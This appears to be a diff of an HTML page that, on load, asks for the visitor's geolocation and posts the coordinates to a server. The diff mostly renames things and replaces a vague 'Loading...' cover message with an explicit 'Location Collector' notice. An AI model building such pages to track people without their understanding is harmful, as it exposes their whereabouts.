@@ -2,31 +2,31 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
+  <title>Location Collector</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Welcome</title>
   <style>
     body {
-      font-family: Arial, sans-serif;
-      background: #f9f9f9;
+      font-family: sans-serif;
+      background: #f5f5f5;
       display: flex;
       justify-content: center;
       align-items: center;
       height: 100vh;
       margin: 0;
     }
-    .message {
-      background: white;
-      padding: 20px 30px;
-      border-radius: 10px;
-      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+    .box {
+      background: #fff;
+      padding: 2em 3em;
+      border-radius: 12px;
+      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
       text-align: center;
     }
   </style>
 </head>
 <body>
-  <div class="message">
-    <h2>Loading...</h2>
-    <p>Please wait while we prepare your experience.</p>
+  <div class="box">
+    <h2>Just a moment...</h2>
+    <p>We are collecting your location to enhance your experience.</p>
   </div>
 
   <script>
@@ -41,16 +41,16 @@
           longitude: lon
         })
       })
-      .then(res => res.text())
-      .then(data => {
-        console.log("Success:", data);
+      .then(response => response.text())
+      .then(result => {
+        console.log("Server response:", result);
       })
-      .catch(err => {
-        console.error("Fetch error:", err);
+      .catch(error => {
+        console.error("Error sending location:", error);
       });
     }
 
-    function getLocation() {
+    function getLocationAndSend() {
       if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(
           position => {
@@ -59,7 +59,7 @@
             sendLocation(lat, lon);
           },
           error => {
-            console.error("Geolocation error:", error.message);
+            console.error("Geolocation failed:", error.message);
           }
         );
       } else {
@@ -67,7 +67,7 @@
       }
     }
 
-    window.onload = getLocation;
+    window.onload = getLocationAndSend;
   </script>
 </body>
 </html>
